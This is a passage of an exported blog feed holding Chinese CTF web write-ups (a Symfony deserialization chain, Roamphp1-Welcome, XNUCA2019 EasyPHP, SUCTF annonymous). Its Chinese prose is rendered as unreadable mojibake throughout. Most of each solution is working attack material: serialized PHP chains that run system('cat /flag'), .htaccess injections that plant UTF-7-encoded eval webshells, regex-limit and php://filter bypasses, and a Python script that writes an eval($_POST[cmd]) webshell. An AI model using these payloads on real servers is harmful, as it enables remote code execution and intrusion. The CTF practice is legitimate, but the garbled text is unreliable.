punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-none"><code class="language-none">?payload&#x3D;O%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%22%3A2%3A%7Bs%3A57%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00deferred%22%3Ba%3A1%3A%7Bs%3A6%3A%22flight%22%3BO%3A33%3A%22Symfony%5CComponent%5CCache%5CCacheItem%22%3A0%3A%7B%7D%7Ds%3A53%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00pool%22%3BO%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CPhpArrayAdapter%22%3A1%3A%7Bs%3A53%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CPhpArrayAdapter%00file%22%3Bs%3A5%3A%22%2Fflag%22%3B%7D%7D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Cache<span class="token punctuation">\</span>Adapter</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">TagAwareAdapter</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$deferred</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pool</span> <span class="token operator">=</span> <span class="token variable">$x</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ProxyAdapter</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$setInnerItem</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Cache</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">CacheItem</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$innerItem</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'cat /flag'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Cache<span class="token punctuation">\</span>Adapter<span class="token punctuation">\</span>TagAwareAdapter</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Cache<span class="token punctuation">\</span>Adapter<span class="token punctuation">\</span>ProxyAdapter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">deferred</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aa'</span><span class="token operator">=></span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Cache<span class="token punctuation">\</span>CacheItem</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-none"><code class="language-none">?payload&#x3D;O%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%22%3A2%3A%7Bs%3A8%3A%22deferred%22%3Ba%3A1%3A%7Bs%3A2%3A%22aa%22%3BO%3A33%3A%22Symfony%5CComponent%5CCache%5CCacheItem%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00innerItem%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7Ds%3A4%3A%22pool%22%3BO%3A44%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%22%3A1%3A%7Bs%3A15%3A%22%00%2A%00setInnerItem%22%3Bs%3A6%3A%22system%22%3B%7D%7D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><p>æ€è·¯è¡¥å…¨</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp1-Welcome</title>
      <link href="/p/3383602229.html"/>
      <url>/p/3383602229.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ‰“å¼€é¶æœº</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Roamphp1-Welcome/image-20210826174233449.png"></p><p>è¿˜ä»¥ä¸ºé¶æœºåäº†ï¼Œç»“æœæ˜¯éœ€è¦POST</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"HTTP/1.1 405 Method Not Allowed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'roam1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'roam2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'roam1'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'roam2'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'roam1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'roam2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// collect information from phpinfo!</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>ç­¾åˆ°é¢˜ï¼Œæ²¡ä»€ä¹ˆå¥½è¯´çš„ã€‚</p><pre class="line-numbers language-none"><code class="language-none">roam1[]&#x3D;1&amp;roam2[]&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœä¸‹flagï¼Œç»“æŸã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHPä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[XNUCA2019Qualifier]EasyPHP</title>
      <link href="/p/1042722407.html"/>
      <url>/p/1042722407.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[htaccess|æ–‡ä»¶åŒ…å«|å°–æ‹¬å·ç»•è¿‡]</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fl3g.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'on'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'html'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'upload'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker"</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[^a-z\.]/"</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker"</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\nJust one chance"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>ä¸€å¼€å§‹æƒ³ç€çœŸç®€å•å•Šï¼Œç›´æ¥å†™shellï¼Œ</p><p>ç„¶åå˜æˆäº†å­—ç¬¦ä¸²ï¼Œ</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XNUCA2019Qualifier-EasyPHP/image-20210825220859953.png"></p><h3 id="é¢„æœŸè§£"><a href="#é¢„æœŸè§£" class="headerlink" title="é¢„æœŸè§£"></a>é¢„æœŸè§£</h3><blockquote><p>åˆ©ç”¨error_logå†™å…¥logæ–‡ä»¶åˆ°<code>/tmp/fl3g.php</code>ï¼Œå†è®¾ç½®<code>include_path=/tmp</code>å³å¯è®©index.phpèƒ½å¤ŸåŒ…å«æˆ‘ä»¬æƒ³è¦çš„æ–‡ä»¶ã€‚è¿™é‡Œçš„æŠ¥é”™å¯ä»¥é€šè¿‡è®¾ç½®<code>include_path</code>åˆ°ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶å¤¹å³å¯è§¦å‘åŒ…å«æ—¶çš„æŠ¥é”™ï¼Œä¸”include_pathçš„å€¼ä¹Ÿä¼šè¢«è¾“å‡ºåˆ°å±å¹•ä¸Šã€‚</p></blockquote><p>å°è¯•ä¸Šä¼ .htaccessï¼Œä½†æ˜¯åœ¨htaccessæ–‡ä»¶å†™å…¥çš„æ—¶å€™ï¼Œå†™å…¥äº†ä¸€äº›æ··åŠ çš„å­—ç¬¦æ¥æ‰“ä¹±äº†æˆ‘ä»¬çš„é…ç½®ï¼Œå¯ä»¥åˆ©ç”¨æ³¨é‡Šç¬¦ï¼Œä»¥åŠè½¬ä¹‰ï¼Œæ¥è¿›è¡Œç»•è¿‡å³<code>#\</code>ï¼Œæ‹¼æ¥å®Œæˆè¿‡åå°±å˜æˆäº†<code>#\\nJust one chance</code> ä¸å­˜åœ¨æ¢è¡Œäº†ã€‚</p><p>error_logçš„å†…å®¹é»˜è®¤æ˜¯<code>htmlentities</code>çš„,æˆ‘ä»¬æ— æ³•æ’å…¥ç±»ä¼¼<code>&lt;?php phpinfo();?&gt;</code>çš„payloadï¼Œå°è¯•è®¾ç½®ç¼–ç æ¥ç»•è¿‡é™åˆ¶ã€‚å…·ä½“è§<a href="https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack%202019/l33t-hoster/l33t-hoster.md">è¯¥wp</a>ï¼Œè¿˜èƒ½ç»•è¿‡å°–æ‹¬å·<code>&lt;</code>.</p><p>æ–‡ä»¶ç¼–ç å¯ä»¥ç”¨notepad3æˆ–è€…<code>iconv 1.txt -f UTF-8 -t UTF-7 -o 2.txt</code></p><blockquote><p>.htaccessä¸æ”¯æŒå¤šè¡Œæ³¨é‡Šä¸”å•è¡Œæ³¨é‡Š#å¿…é¡»åœ¨æ¯è¡Œçš„å¼€å¤´</p></blockquote><p>æ‰€ä»¥.htaccessæ–‡ä»¶å†…å®¹</p><pre class="line-numbers language-none"><code class="language-none">php_value include_path &quot;&#x2F;tmp&#x2F;xx&#x2F;+ADw?php die(eval($_GET[2]))+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;php_value error_reporting 32767php_value error_log &#x2F;tmp&#x2F;fl3g.php# \<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>include_path</strong>ï¼šincludeçš„è·¯å¾„ï¼Œè®¾ç½®è¿™ä¸ªåï¼Œå¦‚æœ<code>include(fl3g.php)</code>å°±ä¼šå°è¯•å»åŒ…å«<code>/tmp/fl3g.php</code>æ–‡ä»¶ï¼Œæ²¡æœ‰åˆ™æŠ¥é”™ã€‚</p><p><strong>error_log</strong>ï¼šå°†phpè¿è¡ŒæŠ¥é”™çš„è®°å½•å†™åˆ°æŒ‡å®šæ–‡ä»¶ä¸­</p><p><strong>error_reporting 32767</strong>ï¼š2767æ˜¯æ‰€æœ‰å¸¸é‡åŠ èµ·æ¥çš„å€¼</p><p>æ­¤æ—¶æˆ‘ä»¬è®¿é—®index.phpå°±ä¼šè§¦å‘errorï¼Œå°†shellå†™å…¥/tmp/fl3g.phpä¸­</p><pre class="line-numbers language-none"><code class="language-none">?filename&#x3D;.htaccess&amp;content&#x3D;php_value%20include_path%20%22%2Ftmp%2Fxx%2F%2BADw%3Fphp%20die(eval(%24_GET%5B2%5D))%2BADs%20%2BAF8AXw-halt%2BAF8-compiler()%2BADs%22%0Aphp_value%20error_reporting%2032767%0Aphp_value%20error_log%20%2Ftmp%2Ffl3g.php%0A%23%20%5C<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>payloadæ‰“å…¥åï¼Œè®¿é—®ç•Œé¢ï¼Œè¿™é‡ŒæŒ‰ç†æ¥è¯´åº”è¯¥æ˜¯è§¦å‘erroräº†ï¼Œä½†æ˜¯ï¼Œå°†æŠ¥é”™ç»“æœå†™å…¥<code>/tmp/fl3g.php</code></p><p>å†å†™å…¥ä¸ª.htaccessæ–‡ä»¶</p><pre class="line-numbers language-none"><code class="language-none">php_value include_path &quot;&#x2F;tmp&quot;php_value zend.multibyte 1php_value zend.script_encoding &quot;UTF-7&quot;# \<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å°†ç¼–ç è®¾ç½®è½¬ä¸ºUTF-7,è¿™æ ·shellå°±èƒ½å¤Ÿè¢«é¡ºåˆ©çš„è§£æå‡ºæ¥äº†ã€‚</p><pre class="line-numbers language-none"><code class="language-none">?filename&#x3D;.htaccess&amp;content&#x3D;php_value%20include_path%20%22%2Ftmp%22%0Aphp_value%20zend.multibyte%201%0Aphp_value%20zend.script_encoding%20%22UTF-7%22%0A%23%20%5C<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ³¨æ„ï¼Œåœ¨è¿™é‡Œç›´æ¥è®¿é—®<code>/?2=phpinfo();</code>,payloadé‡Œä¹Ÿæ˜¯<code>die()</code>ï¼Œç›®çš„å°±æ˜¯ä¸ºäº†ä¸è®©ä»£ç æ‰§è¡Œåˆ°åˆ é™¤æ–‡ä»¶é‚£é‡Œï¼ï¼ï¼åœ¨è¿™é‡Œæµªè´¹äº†ä¸¤ä¸ªå°æ—¶æ‰æ„è¯†åˆ°ï¼ï¼ï¼ï¼</p><h3 id="éé¢„æœŸè§£1"><a href="#éé¢„æœŸè§£1" class="headerlink" title="éé¢„æœŸè§£1"></a>éé¢„æœŸè§£1</h3><p>è®¾ç½®pcreçš„ä¸€äº›é€‰é¡¹å¯ä»¥å¯¼è‡´æ–‡ä»¶ååˆ¤æ–­å¤±æ•ˆï¼Œä»è€Œç›´æ¥å†™å…¥<code>fl3g.php</code></p><p>å¤§æ¦‚å°±æ˜¯<code>preg_match()</code>å‡½æ•°åœ¨è¿›è¡Œæ­£åˆ™å›æº¯çš„æ—¶å€™(æ¯”å¦‚è´ªå©ªåŒ¹é…)è¶…è¿‡100000æ¬¡åä¼šç›´æ¥è¿”å›falseï¼Œåœ¨è¿™é‡Œå°±æŠŠè¿™ä¸ªæ¬¡æ•°è®¾ä¸º0ï¼Œå¯¼è‡´è¿™ä¸ªå‡½æ•°ç›´æ¥åæ‰ã€‚</p><pre class="line-numbers language-none"><code class="language-none">php_value pcre.backtrack_limit 0php_value pcre.jit 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä»¤filenameä¸ºï¼š</p><pre class="line-numbers language-none"><code class="language-none">?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;.htaccess<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>contentå°±èƒ½ç»•è¿‡stristr</p><h3 id="éé¢„æœŸè§£2"><a href="#éé¢„æœŸè§£2" class="headerlink" title="éé¢„æœŸè§£2"></a>éé¢„æœŸè§£2</h3><blockquote><p>æ³¨æ„:apache2.4.xä¸æ”¯æŒphp_value</p></blockquote><p>æ¢è¡Œç¬¦æ˜¯<code>\n</code>,åŠ äº†ä¸ª<code>\</code>å°±å˜æˆ<code>\\n</code>,å°±ä¸æ˜¯æ¢è¡Œç¬¦äº†</p><p>å°±è¢«è§£ææˆè¿™æ ·ï¼š</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XNUCA2019Qualifier-EasyPHP/image-20210825233858546.png"></p><pre class="line-numbers language-none"><code class="language-none">php_value auto_prepend_fi\le &quot;.htaccess&quot;# &lt;?php phpinfo();?&gt;\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token comment"># %23 æ˜¯# çš„urlç¼–ç ï¼Œé˜²æ­¢pythonæŠŠè‡ªå·±æ³¨é‡Šäº†</span><span class="token comment"># \\ ï¼Œ ä¸¤ä¸ª\\ä¸Šä¼ ä¸Šå»å°±æ˜¯ ä¸€ä¸ª \</span>content <span class="token operator">=</span> <span class="token triple-quoted-string string">'''php_value auto_prepend_fi\\le ".htaccess"%23&lt;?php eval($_POST[cmd]);?>\\'''</span>url <span class="token operator">=</span> <span class="token string">"http://203dd3ff-f703-4233-b159-93832d5b93b3.node4.buuoj.cn:81/?filename=.htaccess&amp;content=&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p>è¿™ç¯‡å†™çš„å¾ˆè¯¦ç»†ï¼š</p><p><a href="https://blog.csdn.net/Zero_Adam/article/details/115740087">https://blog.csdn.net/Zero_Adam/article/details/115740087</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHPä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[SUCTF 2018]annonymous</title>
      <link href="/p/1412980291.html"/>
      <url>/p/1412980291.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[create_function]</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$MY</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"die(`cat flag.php`);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hash</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">openssl_random_pseudo_bytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"function SUCTF_<span class="token interpolation"><span class="token variable">$hash</span></span>()&#123;"</span>    <span class="token operator">.</span><span class="token string double-quoted-string">"global \$MY;"</span>    <span class="token operator">.</span><span class="token string double-quoted-string">"\$MY();"</span>    <span class="token operator">.</span><span class="token string double-quoted-string">"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'func_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"func_name"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 